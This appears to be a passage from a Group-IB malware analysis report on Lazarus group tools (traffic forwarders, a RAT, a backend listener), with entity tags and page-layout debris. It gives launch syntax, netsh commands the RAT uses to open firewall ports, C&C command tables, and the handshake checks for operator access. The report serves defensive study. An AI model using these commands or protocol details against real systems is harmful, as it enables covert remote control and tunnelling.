+<MALWARE>Client_TrafficForwarder</MALWARE>
+
+This program is designed to provide access to the local network and is also 
+installed using the original <MALWARE>Dropper</MALWARE>. The installation scheme is as follows: 
+<MALWARE>Dropper</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Payload</MALWARE>.
+
+The <IOC>gpsvc.exe</IOC> and <IOC>MBLCTR.EXE</IOC> files (size: 753664 bytes, MD5: <IOC>85d316590edfb4212049c4490db08c4b</IOC>) are executable files and can be classified as <MALWARE>Loader</MALWARE>. 
+This file is installed on the target system using <MALWARE>Dropper</MALWARE>, which is downloaded 
+using <MALWARE>RECON</MALWARE> or <MALWARE>Client_RAT</MALWARE>.  
+
+This console can be launched with the following arguments:
+
+• Key means an encryption key. A MD5 hash (hashing algorithm) of this key is used to 
+decrypt the configuration file.
+
+• Config means a path to the configuration file that contains the name of the service, its 
+description, and the loader of the main module, which will be installed on the system as 
+
+a service.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution33
+
+The program can also read executable data from the following registry keys 
+and embed them into the selected process: 
+
+• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\
+Security\Data2
+
+• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\
+Security\Data3
+
+<IOC>fdsvc.exe</IOC> (MD5 <IOC>9914075cc687bdc352ee136ac6579707</IOC> and 60928 bytes) is an 
+executable file and can be classified as <MALWARE>Loader</MALWARE>.
+
+Example of the <MALWARE>Loader</MALWARE> launch:
+
+<IOC>loader.exe</IOC> -d "encrypted_payload.bin" -p 1540 -s 
+[encrypted_C&C:port] -r [encrypted_commands]
+
+<MALWARE>Loader</MALWARE> is used to decrypt payload. The file named <IOC>fdsvc.dll</IOC> (MD5: <IOC>9cc6854bc5e217104734043c89dc4ff8</IOC>, size: 480768 bytes) is an encrypted 
+payload which is <MALWARE>Client_TrafficForwarder</MALWARE>.
+
+After decryption, it becomes a simple DLL (MD5 <IOC>25200d3fe30785f3c90a91faf8ebf1b5</IOC>, size: 519392 bytes) and is used to create a tunnel from 
+the C&C server to the specified network resource. The payload provides 
+a secure connection over a specially created protocol via a proxy server 
+(an infected current host).
+
+Description
+
+The payload was compiled statically with the libcurl library, version 
+7.49.1 (<TIMESTAMP>May 30, 2016</TIMESTAMP>), LibTomMath, and the libgcrypt library to support 
+encrypted TLS traffic.
+
+ 
+
+Arguments Description
+
+-d Name of the file for decryption
+
+-p ID of the process in which the payload should be embedded
+
+-r Encrypted param1
+
+-s Encrypted param2
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution34
+
+Some constants from the libgcrypt library are presented below:
+
+After decoding arguments (the arguments that were passed to the second 
+stage module), the payload gets an IP address and a port of the C&C server. 
+The payload communicates with the C&C server using a specific encryption 
+protocol at the application level. 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution35
+
+If the remote host is specified, then the connection is performed to this node. 
+As has been mentioned, the sample body contains several Russian words in 
+transliteration:
+
+"Nachalo" is a debugging string that will be sent in encrypted format to the 
+C&C server, indicating that a connection to the target node is established. 
+When executing a thread, 5 attempts are made to connect to the C&C server 
+directly. The program will shut down if the connection fails. In the event the 
+connection is successful, the application receives commands from the C&C 
+server and executes them. All commands and server responses are encrypted 
+by default, but for your convenience, they are listed below in decrypted form.
+
+The main purpose of connecting to the C&C server is to receive (or send) 
+encrypted content from the server to the target machine. The connection 
+to the C&C server is performed to the network address and port that are 
+specified as command-line arguments when the sample is launched (by 
+<MALWARE>Loader</MALWARE>).
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution36
+
+Below is a list of available commands: 
+
+By sending the "ssylka" message to the C&C server, the analyzed file can 
+make the C&C server keep the connection open for further traffic redirection 
+between the C&C server and Layer 1. The "ssylka" command is executed 
+in the event the "pereslat" command is received from the C&C server. This 
+means that the C&C server initiates the communication session by sending the 
+«pereslat» command and waits for the incoming connection from the program 
+(with the "ssylka" message) to further forward traffic between the C&C server 
+and Layer 1 (communications are possible in both directions). The sample 
+does not have a list of commands to forward traffic between the C&C server 
+and Server2, it just redirects data from the one socket to another, when two 
+connections are active.
+
+One of the commands that can be received from the C&C server is 
+«ustanavlivat». In the event the program receives it, it performs an additional 
+request to the C&C server and receives a network address of the Server2 
+node, which will be further used as an end point to proxy network traffic. 
+
+The "kliyent2podklyuchit" message is intended to check the efficiency 
+of an intermediate proxy server, through which network connections 
+will be performed. If the target computer is specified in the command 
+line, the sample will connect to this host with an additional message 
+"kliyent2podklyuchit". The connection is performed using the functionality of 
+the statically linked library “libcurl”. In the event the connection is successful, 
+traffic from the C&C server will further go through the proxy. If not, the 
+application terminates its operation.
+
+Command Description
+
+ustanavlivat to receive a network address 
+of the active Server2 server 
+from the C&C server (the 
+address will be sent in the next 
+package)
+
+poluchit to send a network address of 
+the current Layer 2 server to 
+the C&C server
+
+pereslat to forward data between the 
+C&C server and Server2
+
+derzhat to keep the connection open
+
+vykhodit to terminate the session
+
+Command Description
+
+Nachalo This message sent to the C&C 
+server or the proxy during 
+the start of the sample is the 
+start-up indicator
+
+kliyent2podklyuchit a testing proxy performance 
+package
+
+ssylka to connect to the С&C server 
+to forward traffic between the 
+C&C server and Server2
+
+vykhodit notifying the C&C server of 
+session termination
+
+Commands from the C&C server Messages to the C&C server
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution37
+
+The C&C server also may send the "poluchit" command. Once this command 
+is received, the analyzed file will send a network address of the current server 
+Server2 to the C&C server. 
+
+The next possible command from the C&C server is "pereslat". Once this 
+command is received, the file requests data from the C&C server and receives 
+a certain X number. Following this, the sample will execute a multi-threaded 
+C&C request with the "ssylka" command and forward traffic between the 
+C&C server and Server2 nodes, when necessary. The number of threads for 
+traffic redirection is equal to the X number that was previously obtained from 
+the C&C server. If X> 1, then more than one equivalent tunnel is established 
+simultaneously to redirect traffic from the C&C server to Server2 (the "ssylka" 
+command).
+
+"On top" of the application protocol with encryption, application traffic is 
+wrapped up inside ordinary TLS. "Visible" network traffic is a simple TLS 
+connection. 
+
+16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 1C C0 13 C0 14 C0 27 C0 2F 
+00 9E 00 6B 00 67 00 39 00 33 00 9C 00 3D 00 3C 00 35 00 2F 01 00 xx xx 00 
+0A 00 08 00 06 xx xx xx xx xx xx
+
+16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 0E C0 13 C0 14 00 39 00 39 
+00 33 00 35 00 2F 01 00
+
+16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 xx 00 00 05 FF 01 00 01 00
+
+<MALWARE>ServerRAT</MALWARE>
+
+The <IOC>ejbss.dll</IOC> library (MD5: <IOC>570e6ea21cdce694a4a74876ca87534a</IOC>, size: 
+226304 bytes) is classified as <MALWARE>ServerRAT</MALWARE>. 
+
+Description
+
+The file is a resident <MALWARE>RAT</MALWARE> application that, once launched, waits for 
+incoming connections on a specific port to control the infected PC. The 
+functions available for a remote operator include launching arbitrary 
+commands, collecting data about the system, active PC sessions and 
+running processes, deleting arbitrary files, reading data from the file, 
+downloading and executing files.
+
+The program is installed as a service (purportedly using <MALWARE>Dropper</MALWARE>) and 
+extracts the payload from itself. The scheme is similar to that that is used 
+to infect client (target) machines.
+
+Through examination of infected proxies, <ORG>Group-IB</ORG> specialists identified a 
+service called rpcapt and a path to the program %WINDIR%\ejbss.dll.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution38
+
+After startup, Payload is extracted and decrypted
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution39
+
+The decrypted file is also a dynamic library containing a payload. 
+After decryption, the file looks for exported funtion with ordinal #1 
+and calls it.  
+
+• On first run the application checks for the "<IOC>mbcrs.rll</IOC>" file in the OS 
+system directory. In the event the file exists, the app decrypts it and 
+reads a port number from the file. This number will then be used 
+for network communications. If the file does not exist, it is created 
+and the port number generated in random fashion is added there in 
+encrypted form. It is worth noting that <ORG>Group-IB</ORG> specialists always 
+observed port 3365 on the proxy.
+
+• The file can use a port preconfigured by the attacker (and not a port 
+with a random number), if the "<IOC>mbcrs.rll</IOC>" file was copied with it during 
+the <MALWARE>RAT</MALWARE> installation.
+
+• For the network port that will be used for network communications, 
+an rule is generated for the OS firewall. This action is performed by 
+running one of the following commands:
+
+netsh advfirewall firewall add rule name=CoreNetworkingHTTPS 
+dir=in action=allow Protocol=TCP localport=%d
+
+netsh firewall add portopening protocol=tcp port=%d 
+name=CoreNetworkingHTTPS
+
+where %d – the above-mentioned port number
+
+• waits for incoming connections from the operator on the port, 
+mentioned in the point above
+
+• can execute commands as required by the operator
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution40
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution41
+
+• The table below contains a list of all commands available:
+
+Command Description
+
+OF Collects and sends the following system data to the operator: OS version, 
+processor, computer name, information about network interfaces, information 
+about mounted disks
+
+OG Enumerates and sends data about existing disks in the system
+
+OH Checks for certain files on the disk
+
+OR Changes the current working directory
+
+OI Enumerates and sends running processes
+
+OJ Terminates the process with a specific name
+
+OM Runs the command / file
+
+ON Deletes a specific file
+
+OO Writes data to a specific file
+
+OP Sets the timestamps to a specific file that are the same as those of the system 
+file shell32.dll 
+
+OQ Executes the command and send its output
+
+OU Create a file with specified content and set the file timestamp that is the same 
+as the timestamp of shell32.dll
+
+OT Reads the file contents and sends it to the operator
+
+OS Searches for the specified file or directory, reads its contents and sends it to 
+the operator
+
+OV Gets and sends disk information
+
+OW Modifies the file’s timestamp
+
+OE Connect to a specific network node for traffic transmission
+
+OX Reads, decrypts, and sends data from a file of the form “%windir%\system32\
+hyrX.dll” in the system directory (where X is an arbitrary substring), 
+purportedly containing the bot configuration
+
+OY Writes data to a file in the system directory
+
+OZ Gathers data about active sessions
+
+OС Sends the "0d" command to the operator
+
+OK Sends the "0a" command to the operator
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution42
+
+Server_TrafficForwarder
+
+The <IOC>msvmgr.exe</IOC> (MD5: <IOC>3c3982d068bc7f2d1e4742c2009b0f46</IOC>, size: 
+180224 bytes) and <IOC>msdtc.exe</IOC> (MD5: <IOC>b603a16a950056df336fe3950c81601d</IOC>, size: 348160 bytes, MD5: <IOC>d032aeb54cf1229e011c070ecd64c33</IOC>, size: 
+315904 bytes) executable programs are <MALWARE>Server_TrafficForwarder</MALWARE>.
+
+On infected proxies, these programs always were child processes of 
+<MALWARE>ServerRAT</MALWARE> and were located in %windows%.
+
+Description
+
+The file is a resident application that, once launched, waits for incoming 
+connections on a specific port to provide further control of the PC to the 
+attacker.
+
+<MALWARE>Server_TrafficForwarder</MALWARE> uses the wolfSSL staticly linked library to 
+implement asymmetric encryption of traffic between the client and the 
+server.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution43
+
+Keys
+
+It has two related files:
+
+The “<IOC>wcer.dat</IOC>” file (size: 4382 bytes, md5: <IOC>E39C8A1B2D35EC1B7BF73599EA4A33FA</IOC>) is a certificate file:
+
+The “<IOC>wkey.dat</IOC>” file (size: 1675 bytes, md5: <IOC>F329B8A6957635C8CCA1C97FA459DC82</IOC>) is a private key file
+
+The related files are used to encrypt network traffic and verify the client.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution44
+
+Information about the C&C server or addresses of clients is not available 
+in the file. The sample just waits for incoming connections to the selected 
+port. 
+
+Main functionality
+
+• Parses the command line arguments 
+Example: "<IOC>msvmgr.exe</IOC> 4444 <IOC>111.222.111.222</IOC> 31337" 
+
+The sample must be run with the following arguments:
+
+<IOC>msvmgr.exe</IOC> port ip1 port2
+
+where port is a port used to wait for incoming connections
+
+ip1 - an IP address of Layer 2 server to which it is required to connect
+
+port2 – a port of the Layer 2 server, to which it is required to connect to redirect 
+traffic
+
+Based on the above-mentioned information, in the event the second command 
+line argument (IP address) is specified, then after establishing connection with the 
+client, the sample will connect to the network node from the second argument 
+(for the above-mentioned example this will be "<IOC>111.222.111.222</IOC>") to the port from 
+the third argument (31337 in the example). This server will be used to proxy traffic 
+from the client. If the command-line arguments are not specified, the remote 
+client will accept incoming connections, but will not tunnel the traffic, because it 
+will not be able to establish an outgoing connection with the next node (it is not 
+specified) and run two threads to redirect traffic. 
+
+• After the start, it reads the contents of the key and certificate file 
+from the current directory.
+
+• It binds the port from the arguments; if the arguments do not 
+contain a port — it listens on a random port and waits for incoming 
+connections
+
+Supported functionality:
+
+• performs network communications over an encrypted protocol
+
+• self-removal
+
+• reads and sends system information: about PC components, locales, 
+free space on disks, RAM size, network adapters and local interfaces, 
+OS version, <SOFTWARE>Windows</SOFTWARE> version identifier, PC name
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution45
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution46
+
+• can read and send the contents of the private key file
+
+• checks the validity of client’s responses (checking if this is a legitimate 
+client). After first network request program gets the response from the 
+client, decrypts and compares it with a previously known response. In the 
+event he gets a different response - it drops the connection.
+
+Below is the table of all available commands:
+
+Table 1
+
+Command Description
+
+0x1095 -
+
+0x1096 Collects and sends system information
+
+0x10AA Gets the configuration
+
+0x10AB Changes the configuration (including the port on which it listens for 
+connections)
+
+0x10AE -
+
+0x10AF -
+
+0x10B3 Reads a private key file and sends it to the operator
+
+0x10B4 Writes data to a file
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution47
+
+<ORG>Group-IB</ORG> specialists have detected several versions of the file. They differ in 
+the list of available commands. Another version of the malicious file has the 
+following command list:
+
+Table 2 
+
+<MALWARE>Backend_Listener</MALWARE>
+
+An executable file “<IOC>msdtc.exe</IOC>” (MD5: <IOC>5C1917F6753D03A08328132DB1E06571</IOC>, 
+size: 257 536 bytes) can be classified as <MALWARE>Backend_Listener</MALWARE>.
+
+It is a service application waiting for incoming connections on two ports. It 
+can redirect traffic from one port to another, thereby implementing a tunnel 
+between the client connected to the second port and the client connected to 
+the first one and vise versa.
+
+Description
+
+Once launched, the application extracts two arguments from the command 
+line. These are port numbers on which the application will wait for incoming 
+connections.
+
+Command Description
+
+NONE -
+
+GINF Collects and sends system information about the PC
+
+GCFG Gets configuration
+
+SCFG Changes the configuration (including the port on which it listens connections)
+
+SLEP -
+
+HIBN -
+
+LCLR Records data to the file
+
+LDWN Reads a private key file and sends it to the operator
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution48
+
+To encrypt traffic, an open source library named wolfSSL is used. After the 
+application is started, the private key and certificate files will be extracted 
+from the current directory. They are used to encrypt traffic between the 
+server and connected clients that must have identical key pairs. Without them, 
+you can not connect to the service, or decrypt its traffic.
+
+The program opens two ports and waits for incoming connections from 
+the operator on one of them. The first port is port1 from the command-line 
+arguments. Port2 is the second argument. In our study, the first port was port 
+8080, the second one was port 9090.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution49
+
+In order to trigger traffic from one port to another, the operator performs 
+a connection to the server (server is the current sample, because it is just a 
+service waiting for incoming connections) on port2 (9090).
+
+Only an operator can connect to the server to control traffic because the 
+service uses a private and public key pair to authorize and encrypt traffic (and 
+this key pair must be identical to the one that the client-operator will use). In 
+the event of absence of a key pair, or with a different pair of keys, the service 
+will drop connections.
+
+To establish a successful connection, several checks will be performed. In 
+addition, traffic is encrypted with a reversible algorithm.
+
+Response data from the server is partially randomized. Probably, this 
+is intended to randomize the length of outgoing packets, so that traffic 
+generated by the server alters, which complicates its detection.
+
+If all the legitimacy tests of the operator’s commands are passed, two traffic 
+threads from one port to another will be triggered.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution50
+
+Following this, when the client connects to the first port (8080), the service 
+will forward traffic from the first port to the second one and back.
+
+If there are no active connections on the first port, the server issues the 
+"PELS" command to the client connected to the second port.
+
+To reverse-engineer the protocol of server communications with 
+connected clients, <ORG>Group-IB</ORG> specialists have developed a client that 
+successfully connects to both ports of the server. Its code was created 
+based on the server’s requests and responses as well as using the open 
+source library wolfSSL.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution51
+
+To connect to the server in order to tunnel traffic, the operator should use 
+<MALWARE>Admin_Tool</MALWARE> designed to control the infrastructure:
+
+1. <MALWARE>Admin_Tool</MALWARE> must have a key pair identical to the server
+
+2. It sends a customized Hello-packet that differs from the one that is 
+provided by the library.  
+ 
+By default this packet (msg) is specified as follows in the library: 
+  
+
+The correct Hello packet that will be accepted by <MALWARE>Backend_Listener</MALWARE> must be of the 
+following form:
+
+ 
+In fact, this is an information packet, rather than a Hello packet, and its first 
+byte contains the length of the next packet sent («len»), while the rest bytes 
+must be zero in this case. 
+
+3.    <MALWARE>Admin_Tool</MALWARE> sends an encrypted (special) packet with a length from the 
+previous packet (len).
+
+4.   The server decrypts the contents of the packet sent and, after decryption, 
+the following conditions must be true: 
+
+(DWORD)&decrypted_buff[5] == len
+
+(DWORD)&decrypted_buff[15] == len 
+
+where len is the length of the packet
+
+ 
+
+5.    <MALWARE>Admin_Tool</MALWARE> sends DWORD with len2 < 201 where len2 is the length of the 
+next packet 
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution52
+
+6.    <MALWARE>Admin_Tool</MALWARE> sends the encrypted (special) second packet with the length 
+received in the previous packet 
+
+7.    The server decrypts the contents of the packet sent, and after decryption, 
+the following conditions must be true: 
+
+(DWORD)&decrypted_buff[4] == 0xD1CC8594
+
+(DWORD)&decrypted_buff[8] == 3
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution53
+
+Preventing  
+and investigating 
+cybercrime <TIMESTAMP>since 2003</TIMESTAMP>
+
+www.group-ib.com
+
+blog.group-ib.com
+
+info@group-ib.com
+
++7 495 984 33 64
+
+twitter.com/groupib_gib
+
+linkedin.com/company/group-ib
+
+
